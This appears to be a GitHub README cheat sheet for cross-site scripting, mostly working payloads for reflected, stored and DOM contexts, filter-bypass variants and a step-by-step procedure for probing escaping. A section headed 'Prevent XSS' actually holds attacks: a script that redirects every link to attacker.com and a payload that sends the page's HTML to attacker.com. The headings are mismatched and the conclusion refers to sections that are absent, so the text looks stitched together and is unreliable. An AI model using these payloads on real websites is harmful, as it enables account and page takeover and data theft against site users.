# Summary XSS


### Contents
- [Khái niệm XSS](https://github.com/chi442000/XSS#Concept)
- [Tấn công thực hiện như thế nào](https://github.com/chi442000/XSS#realistic-attack)
- [Các loại tấn công XSS](https://github.com/chi442000/XSS#types-of-attacks)
    - [Reflected XSS](https://github.com/chi442000/XSS#reflected-xss)
    - [Stored XSS](https://github.com/chi442000/XSS#stored-xss)
    - [DOM Based XSS](https://github.com/chi442000/XSS#dom-based-xss)
- [Cách để kiểm thử tấn công XSS](https://github.com/chi442000/XSS#attack-testing)
- [Các cách để ngăn chặn XSS](https://github.com/chi442000/XSS#prevent)
- [Kết luận](https://github.com/chi442000/XSS#in-conclusion)


### Concept
- [prompt.ml](https://prompt.ml)
- [alf.nu/alert1](https://alf.nu/alert1)
- [s-p-o-o-k-y.com](https://www.s-p-o-o-k-y.com)
- [xss-game.appspot.com](https://xss-game.appspot.com)
- [polyglot.innerht.ml](https://polyglot.innerht.ml)
- [sudo.co.il/xss](http://sudo.co.il/xss)
- [hack.me/t/XSS](https://hack.me/t/XSS)
- [root-me.org](https://www.root-me.org/?page=recherche&lang=en&recherche=xss)
- [chefsecure.com](https://chefsecure.com/courses/xss/challenges)
- [wechall.net](https://www.wechall.net/challs/XSS)
- [codelatte.id/labs/xss](https://codelatte.id/labs/xss)

### Realistic Attack
- [Bypassing XSS Detection Mechanisms](https://github.com/s0md3v/MyPapers/tree/master/Bypassing-XSS-detection-mechanisms)
- [XSS in Sarahah](http://www.shawarkhan.com/2017/08/sarahah-xss-exploitation-tool.html)
- [XSS in Facebook via PNG Content Type](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
- [How I met your girlfriend](https://www.youtube.com/watch?v=fWk_rMQiDGc)
- [How to Find 1,352 Wordpress XSS Plugin Vulnerabilities in one hour](https://www.youtube.com/watch?v=9ADubsByGos)
- [Blind XSS](https://www.youtube.com/watch?v=OT0fJEtz7aE)
- [Copy Pest](https://www.slideshare.net/x00mario/copypest)


### Types of Attacks

#### Reflected XSS
Case: `<tag>You searched for $input. </tag>`

```
<svg onload=alert()>
</tag><svg onload=alert()>
```

#### Stored XSS

Case: `<tag attribute="$input">`

```
"><svg onload=alert()>
"><svg onload=alert()><b attr="
" onmouseover=alert() "
"onmouseover=alert()//
"autofocus/onfocus="alert()
```
#### DOM Based XSS
Case: `<script> var new something = '$input'; </script>`

```
'-alert()-'
'-alert()//'
'}alert(1);{'
'}%0Aalert(1);%0A{'
</script><svg onload=alert()>
```

### Attack Testing
Yep, confirm because alert is too mainstream.
```
confirm()
confirm``
(confirm``)
{confirm``}
[confirm``]
(((confirm)))``
co\u006efirm()
new class extends confirm``{}
[8].find(confirm)
[8].map(confirm)
[8].some(confirm)
[8].every(confirm)
[8].filter(confirm)
[8].findIndex(confirm)
```

### Prevent XSS
##### Replace all links
```javascript
Array.from(document.getElementsByTagName("a")).forEach(function(i) {
  i.href = "https://attacker.com";
});
```
##### Source Code Stealer
```html
<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
```
A good compilation of advanced XSS exploits can be found [here](http://www.xss-payloads.com/payloads-list.html?a#category=all)

###  In conclusion
If nothing of this works, take a look at **Awesome Bypassing** section

First of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of reflections.
<br>Now for attribute context, check if double quotes (") are being filtered by entering `x"d3v`. If it gets altered to `x&quot;d3v`, chances are that output is getting properly escaped. If this happens, try doing the same for single quotes (') by entering `x'd3v`, if it gets altered to `x&apos;`, you are doomed. The only thing you can try is encoding.<br>
If the quotes are not being filtered, you can simply try payloads from **Awesome Context Breaking** section.
<br>For javascript context, check which quotes are being used for example if they are doing
```
variable = 'value' or variable = "value"
```
Now lets say single quotes (') are in use, in that case enter `x'd3v`. If it gets altered to `x\'d3v`, try escaping the backslash (\) by adding a backslash to your probe i.e. `x\'d3v`. If it works use the following payload:
```
\'-alert()//
```
But if it gets altered to `x\\\'d3v`, the only thing you can try is closing the script tag itself by using
```
</script><svg onload=alert()>
```
For simple HTML context, the probe is `x<d3v`. If it gets altered to `x&gt;d3v`, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potential filters. The dummy tag I like to use is `x<xxx>`. If it gets stripped or altered in any way, it means the filter is looking for a pair of `<` and `>`. It can simply bypassed using
```
<svg onload=alert()//
```
or this (it will not work in all cases)
```
<svg onload=alert()
```
If the your dummy tags lands in the source code as it is, go for any of these payloads
```
<svg onload=alert()>
<embed src=//14.rs>
<details open ontoggle=alert()>
```

